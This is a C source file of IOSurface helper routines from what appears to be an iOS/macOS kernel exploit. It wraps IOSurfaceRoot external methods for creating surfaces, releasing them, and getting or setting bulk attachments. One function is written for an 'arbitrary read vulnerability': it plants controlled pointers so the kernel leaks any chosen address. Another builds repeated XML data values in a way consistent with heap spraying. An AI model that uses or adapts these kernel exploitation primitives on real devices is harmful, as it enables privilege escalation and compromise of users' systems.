#include "iosurface_utils.h"
#include "Utilities.h"

/*
 * Function name: 	iosurface_utils_get_surface_info
 * Description:		Gets information about an IOSurface object. Currently just its buffer and its size.
 * Returns:			kern_return_t, buffer and size in output params.
 */

kern_return_t iosurface_utils_get_surface_info(io_connect_t conn, uint32_t surface_id, void ** surface_buffer, size_t * buffer_size) {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t surface_id_for_lookup = (uint32_t)surface_id;
	char output_buffer[IOSURFACE_DICTIONARY_SIZE] = {0};
	size_t output_buffer_size = IOSURFACE_DICTIONARY_SIZE;

	ret = IOConnectCallMethod(conn,
		IOSURFACE_EXTERNAL_METHOD_LOOKUP,
		&surface_id_for_lookup, 1,
		NULL, 0,
		NULL, 0,
		output_buffer, &output_buffer_size);

	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: looking up for surface %d", surface_id);
		goto cleanup;
	}

	if (surface_buffer)
	{
		*surface_buffer = *(void**)output_buffer;
	}
	if (buffer_size)
	{
		*buffer_size = *(size_t*)((char*)output_buffer + 0x14);
	}

cleanup:
	return ret;
}



/*
 * Function name: 	iosurface_utils_set_bulk_attachment
 * Description:		Wrapper for the IOSurface::setBulkAttachment function.
 * Returns:			kern_return_t.
 */

kern_return_t iosurface_utils_set_bulk_attachment(io_connect_t conn, uint32_t surface_id, void * bulk_data) {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t surface_id_for_bulks = (uint32_t)surface_id;

	*(uint64_t*)((char*)bulk_data + 0x50) = surface_id_for_bulks;

	ret = IOConnectCallMethod(conn,
		IOSURFACE_EXTERNAL_METHOD_SET_BULK_ATTACHMENT,
		NULL, 0,
		bulk_data, IOSURFACE_BULK_ATTACHMENT_SIZE,
		NULL, 0,
		NULL, 0);

	return ret;
}

/*
 * Function name: 	iosurface_utils_get_bulk_attachment
 * Description:		Wrapper for the IOSurface::getBulkAttachment function.
 * Returns:			kern_return_t.
 */

kern_return_t iosurface_utils_get_bulk_attachment(io_connect_t conn, uint32_t surface_id, char * bulk_data_out) {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t surface_id_for_bulks = (uint32_t)surface_id;
	size_t output_buffer_size = IOSURFACE_BULK_ATTACHMENT_SIZE;

	ret = IOConnectCallMethod(conn,
		IOSURFACE_EXTERNAL_METHOD_GET_BULK_ATTACHMENT,
		&surface_id_for_bulks, 1,
		NULL, 0,
		NULL, 0,
		bulk_data_out, &output_buffer_size);

	return ret;
}


/*
 * Function name: 	iosurface_utils_set_data_for_arbitrary_read
 * Description:		When using the arbitrary read vulnerability, we have to overcome a triple deref sequence.
                    So using set_bulk_attachment, we can control both IOSuface+0x20
                     and IOSurface+0x30 (and other offsets).
                    This allows us to easily (and deterministically) leak any kernel address we want.
 * Returns:			kern_return_t from the set_bulk_attachment call.
 */

kern_return_t iosurface_utils_set_data_for_arbitrary_read(io_connect_t conn, uint32_t surface_id, 
	void * surface_kernel_address,
 	void * address_to_read) {
	
	kern_return_t ret = KERN_SUCCESS;
	char input_buffer[IOSURFACE_BULK_ATTACHMENT_SIZE] = {0};
	*(uint32_t*)(input_buffer + 0x50) = surface_id;
	*(uint32_t*)(input_buffer + 0x48) = 1;

	/* 
		Here we completely control the X8 we load from.
		We want it to load from IOSurface+0x20. Therefore we set it to surface_kernel_address + 0x20
		LDR             X8, [X8,#0x10] ; Load from Memory
	*/
	*(void**)(input_buffer) = surface_kernel_address + 0x20; /* IOSurface+0x20 = surface_kernel_address + 0x20 */

	/*
		Here the initial X8 equals to IOSurface+0x20. So we take *(IOSurface+0x28) on that case.
		LDR             X8, [X8,#8] ; Load from Memory
		LDR             W8, [X8,#0xC] ; Load from Memory
		STR             W8, [X2] ; Store to Memory
	*/
	*(void**)(input_buffer + 8) = address_to_read - 0xC;

	ret = iosurface_utils_set_bulk_attachment(conn, surface_id, input_buffer);


	return ret;
}



/*
 * Function name: 	iosurface_utils_release_surface
 * Description:		Releases an IOSurface.
 * Returns:			kern_return_t.
 */

kern_return_t iosurface_utils_release_surface(io_connect_t connection, uint32_t surface_id_to_free) {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t surface_id = (uint32_t)surface_id_to_free;

	ret = IOConnectCallMethod(connection,
		IOSURFACE_EXTERNAL_METHOD_RELEASE,
		&surface_id, 1,
		NULL, 0,
		NULL, 0,
		NULL, 0);

	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: releasing surface ID %d", surface_id_to_free);
		goto cleanup;
	}

cleanup:
	return ret;
}


/*
 * Function name: 	iosurface_utils_create_surface
 * Description:		Creates an IOSurface object.
 * Returns:			kern_return_t with the IOKit call. 
 					Additionally, the IOSurface ID will be returned as an output parameter.
 */

kern_return_t iosurface_utils_create_surface(io_connect_t connection, uint32_t * surface_id_out, void * output_buffer_ptr) {
	
	kern_return_t ret = KERN_SUCCESS;
	char buf[0x1000] = {0};

	char output_buffer[IOSURFACE_DICTIONARY_SIZE] = {0};
	size_t output_buffer_size = sizeof(output_buffer);

	strcpy(buf, "<dict>");
	strcat(buf, "<key>IOSurfaceWidth</key>");
	strcat(buf, "<integer>100</integer>");
	strcat(buf, "<key>IOSurfaceHeight</key>");
	strcat(buf, "<integer>100</integer>");
	strcat(buf, "<key>IOSurfaceElementHeight</key>");
	strcat(buf, "<integer>10</integer>");
	strcat(buf, "<key>IOSurfaceElementWidth</key>");
	strcat(buf, "<integer>10</integer>");
	strcat(buf, "<key>IOSurfaceBytesPerElement</key>");
	strcat(buf, "<integer>1000</integer>");
	strcat(buf, "<key>IOSurfaceIsGlobal</key>");
	strcat(buf, "<true/>");
	strcat(buf, "</dict>");

	ret = IOConnectCallMethod(connection,
		IOSURFACE_EXTERNAL_METHOD_CREATE,
		NULL,
		0,
		buf,
		strlen(buf) + 1,
		NULL,NULL,
		output_buffer, &output_buffer_size);

	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: creating IOSurface");
		goto cleanup;
    } else {
        printf("[INFO]: successfully created surface\n");
    }
    
	*surface_id_out = *(uint32_t*)(output_buffer + IOSURFACE_SURFACE_ID_OFFSET);
	if (output_buffer_ptr)
	{
		memcpy(output_buffer_ptr, output_buffer, sizeof(output_buffer));
	}



cleanup:
	return ret;
}



/*
 * Function name: 	iosurface_utils_get_connection
 * Description:		Obtains a connection to an IOSurfaceRoot object.
 * Returns:			kern_return_t from the kernel. Accepts also an output parameter for an io_connect_t
 */
kern_return_t iosurface_utils_get_connection(io_connect_t * conn_out) {

	kern_return_t ret = KERN_SUCCESS;
	io_connect_t connection = 0;
	mach_port_t master_port = 0;
	io_iterator_t itr = 0;
	io_service_t service = 0;

	ret = host_get_io_master(mach_host_self(), &master_port);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: Failed getting master port\n");
		goto cleanup;
	}

	ret = IOServiceGetMatchingServices(master_port, IOServiceMatching(IOSURFACE_IOKIT_SERVICE), &itr);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: iosurface_utils_get_connection Failed getting matching services\n ");
		goto cleanup;
	}

	while(IOIteratorIsValid(itr) && (service = IOIteratorNext(itr))) {
		ret = IOServiceOpen(service, mach_task_self(), 0, &connection);
		if (KERN_SUCCESS != ret)
		{
			continue;
		}
	}

cleanup:

	if (KERN_SUCCESS == ret)
	{
		*conn_out = connection;
	}

	if (itr)
	{
		itr = 0;
	}

	return ret;

}

/*
 * Function name: 	iosurface_utils_do_set_value
 * Description:		The actual call to the set_value external method.
 * Returns:			kern_return_t.
 */

static
kern_return_t iosurface_utils_do_set_value(io_connect_t conn, void * input_buffer, size_t input_buffer_size) {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t output_buffer = 0;
	size_t output_buffer_count = 4;

	ret = IOConnectCallMethod(conn, IOSURFACE_EXTERNAL_METHOD_CREATE_SET_VALUE,
		NULL,
		0,
		input_buffer, input_buffer_size,
		NULL, NULL,
		&output_buffer, &output_buffer_count);

	return ret;

}



/*
 * Function name: 	iosurface_utils_set_value
 * Description:		Wrapper for the set value external method.
 * Returns:			kern_return_t.
 */

kern_return_t iosurface_utils_set_value(io_connect_t conn, uint32_t surface_id,
	const char * key, char * data) {
	
	kern_return_t ret = KERN_SUCCESS;
	char input_buffer[0x1000] = {0}; /* maximum allowance */
	char * input_buffer_ptr = input_buffer;
	size_t i = 0;
	size_t data_length = strlen(data);

	*(uint64_t*)(input_buffer_ptr) = surface_id;
	input_buffer_ptr += sizeof(uint64_t);

	strcpy(input_buffer_ptr, "<array><dict>");
	for(i = 0; i < 0x900/data_length; ++i) {
		strcat(input_buffer_ptr, "<key>");
		sprintf(input_buffer_ptr + strlen(input_buffer_ptr), "%c", (char)('1' + i));
		strcat(input_buffer_ptr, "</key><data>");
		strcat(input_buffer_ptr, data);
		strcat(input_buffer_ptr, "</data>");
	}
	sprintf(input_buffer_ptr + strlen(input_buffer_ptr), "</dict><string>%s</string></array>", key);
	
	ret = iosurface_utils_do_set_value(conn, input_buffer, strlen(input_buffer_ptr) + sizeof(uint64_t) + 1);
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: setting value for surface %d", surface_id);
		goto cleanup;
	}

cleanup:
	return ret;
}

